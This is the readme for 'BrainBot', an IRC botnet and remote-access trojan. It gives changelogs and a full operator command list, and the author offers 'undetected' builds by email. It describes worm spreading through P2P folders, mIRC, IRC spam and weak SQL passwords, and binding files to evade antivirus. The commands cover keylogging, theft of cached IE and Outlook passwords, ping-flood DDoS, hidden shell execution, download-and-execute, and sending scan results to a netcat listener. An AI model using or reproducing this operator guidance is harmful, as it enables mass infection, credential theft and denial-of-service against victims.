 ____            _            ___ ____   ____      ____        _   
| __ ) _ __ __ _(_)_ __      |_ _|  _ \ / ___|    | __ )  ___ | |_ 
|  _ \| '__/ _` | | '_ \ _____| || |_) | |   _____|  _ \ / _ \| __|
| |_) | | | (_| | | | | |_____| ||  _ <| |__|_____| |_) | (_) | |_ 
|____/|_|  \__,_|_|_| |_|    |___|_| \_\\____|    |____/ \___/ \__|
                                                                   
                    _                  
 _ __ ___  __ _  __| |_ __ ___   ___ _ 
| '__/ _ \/ _` |/ _` | '_ ` _ \ / _ (_)
| | |  __/ (_| | (_| | | | | | |  __/_ 
|_|  \___|\__,_|\__,_|_| |_| |_|\___(_)
                                       


===========
I'm not responsible for anything you do with this.
It's not ment and coded for using it in real life practice.
ITS YOUR FAULT, if u use this for any illegal purpose

It's just an example!
===========


===========
Changes in update to 1.5::


-p2p Spreader added
-Mirc.ini manipulator-spreader
-IRC spam spreader
-bind file to server function(By flowby -> THX)
-Change Icon function(THX to flowby)

p2p Spreader:
spreads by copying itself to the shared folders of following p2p programs:
kazaa,klite,LimeWire,bearshare,Morpheus,Grokster

Mirc.ini manipulator-spreader:
Manipulates mirc installation in a way so it will send a msg and afterwards the bots
executable to all users in all channels the victim joins.(sends exe via dcc)

IRC spam spreader:
You can chose 5 irc networks and 20 different channels on these nets in builder.
the bots will join in there and spam around your message. You may put a fakesite-URL into the msg
or just let it post a link to your ie sploit... 

bind file to server function:
Lets u bind any file to the server...
btw: makes it undetected =)

Change Icon function:
You can chose an Icon for the bot executable. 
===========


===========
Changes in update to 1.4::

-An sql spreader is included now
-personalmessage-mode is now optional

comments to sql spreader:
U have to specify a FTP server in the editor and the name of the brainbot server.
this server executable will be spread by all ur bots to other sql weak pw servers.
U can specify a network. in this network (for example 217) the bot will scan rando ranges for sql weak pws. 
===========


===========
Changes in update to 1.3::

-upgraded dfind to 0.8 
-added randomnized ident ,so bots cant get banned by ident  
 
New commands: 
  
!upgrade <upgradeURL> 
<upgradeURL> is the URL of the new brainbot server. 
it will be downloaded and executed while the old infection is removed. 
this way u can easy upgrade to another brainbot version or start using another rat/bot 
 
!op <channel> <nick> 
gives <nick> +o in <channel> 
of course only if bot has op in that channel. 
 
!deop <?channel?> <nick> 
gives <nick> -o in <channel> (deop's him =D) 
of course only if bot has op in that channel. 
 
!msg <Nick/chan> <message> 
Sends <message> to the chosen nick or chan =) 
 
!killscan 
stops the current scanningprocess. 
so u can clear the scanlogs by typing !shell del dfind 
===========





Here is a List of all the commands to use with BrainBot beta ::

=======================
=======================
!login <PW>
The Bot only will accept Commands after u logged in with this command...
So your bots wont be took by some thiefs =).
<Pw> stands for the admin - Password you specified in the server builder- form


!logout
This will log u out so that the bot dont accepts comands anymore until u login again


!reboot
forces the infected machine to reboot =D


!shutdown
forces the infected machine to shutdown -.-^^


!info
This will show you some General Information abot the infected box=)


!leave
makes the bot leave the channel ^^


!uninstall
uninstall the bot from infected box


!serials
The bot will post some game serials if installed...
gonna add support for some more games in next version . :)


!floodping <IP/Host>
The bot or bots will flood the specified Host with fast permanent pings!
(such as DDoS... depends on how many bots u got =D)


!logkeyson
turns keylogger on


!logkeysoff
turns keylogger off


!showkeys
shows all the logged keys


!clearlog
will clear the keylog file


!PWS
I think this is the best feature in this bot:
the bot will post cached IE passes and Outlook express passes 


!dloadfile <url> <target>
will download a file from <URL> to <target>


!execfile <location>
Executes the file in <location>


!commands
shows a list of the commands =)

!IP
shows you the current ip of infected box


!nick <Nick>
bot changes its nick to <Nick>


!free 
will show free disk space of infected machine


!spam <channel>
will start spamming the specified channel


!stopspam
stops spamming

========
!scan <Parameters>
scans with the Dfind-0.8 by by class101 
infos at:http://www.governmentsecurity.org/forum/index.php?showtopic=9120

use following parameters:
Usage: !scan <Option> [THREADS]

<Option>: 
-p    <Port> <IP IP> .......... Scan one port on iprange     
+p    <Port> <IP IP> .......... Scan iprange,+logs ok,refused connections 
-p    <Port , Port> <IP IP> ... Scan two ports on iprange    
-p    <Port Port> <IP> ........ Scan a portrange on ip       
+p    <Port Port> <IP> ........ Scan portrange,+logs ok,refused connections 
-ban  <Port Port> <IP> ........ Scan portbanners on ip       
-ban  <Port> <IP IP> .......... Scan portbanners on iprange  
-cgi  <IP> .................... Scan cgi hole                
+ipc  <IP IP> ................. Scan IPC$ null on 139 & 445  
-ipc  <IP IP> ................. Scan IPC$ null on 139        
-ipc2 <IP IP> ................. Scan IPC$ null on 445        
-iis  <IP IP> ................. Scan IIS webservers          
-apa  <IP IP> ................. Scan Apache webservers       
-wdv  <IP IP> ................. Scan WebDav on IIS5.0        
-hpj  <IP IP> ................. Scan HP Web JetAdmin         
-msa  <IP IP> ................. Scan MSADC on webservers     
-ccb  <IP IP> ................. Scan CCBill WhereAmi         
-med  <IP IP> ................. Scan WMedia on webservers    
-php  <IP IP> ................. Scan phpBB on webservers     
-php2 <IP IP> ................. Scan PHP-Nuke on webservers  
-pso  <IP IP> ................. Scan PSOProxy Server         
-fro  <IP IP> ................. Scan frontpage host          
-rea  <IP IP> ................. Scan RealServer component    
-htr  <IP IP> ................. Scan +.htr hole              
-pri  <IP IP> ................. Scan .printer host           
-uni  <IP IP> ................. Scan unicode hole            
-idq  <IP IP> ................. Scan .idq host               
-cod  <IP IP> ................. Scan codered virus hole      
-opx  <IP IP> ................. Scan OptixPRO v1.0 => 1.32(include) hole
-rad  <IP IP> ................. Scan Radmin 2.1 Auth,NTAuth,NULL session
-sql  <IP IP> ................. Scan MS SQL Servers for weak access
-req  <REQ IP IP> ............. Scan File/Dir Request on webservers
                                                                    
!showscan
gives you the scan results

!sendscan <Your IP> <NC Port>
The bot will connect to <Your IP> <NC Port> and echo the dfind results to it
You have to start nc with this parameters before: 
nc -l -p <port> >>dfind  =D

!killscan
stops the current scanningprocess.
so u can clear the scanlogs by typing !shell del dfind
==========

!cat <file>
echos any file from infected box


!raw <IRCcommand>
will execute <IRCcommand> 


!shell <commands>
will execute <commands> hidden on infected host
<commands> can be any dos command + parameters

!upgrade <upgradeURL>
<upgradeURL> is the URL of the new brainbot server. 
it will be downloaded and executed while the old infection is removed.
this way u can easy upgrade to another brainbot version or start using another rat/bot


!op <channel> <nick>
gives <nick> +o in <channel>
of course only if bot has op in that channel.

!deop <channel> <nick>
gives <nick> -o in <channel> (deop's him =D)
of course only if bot has op in that channel.

!msg <Nick/chan> <message>
Sends <message> to the chosen nick or chan =)


=======================
=======================



Thx and greets to Flowby for helping me out with a nice skin, the hook-binder techique and great icon changer=)

check out: http://www.ilusion-free.com  =)

If u got any questions,wishes for new features,or want an undetected server?,(or bugs..?) just mail to:

brainbusterbrain@web.de

or add me to msn:

brainbuster88@hotmail.com

looking forward to get some feedback ;)



 

 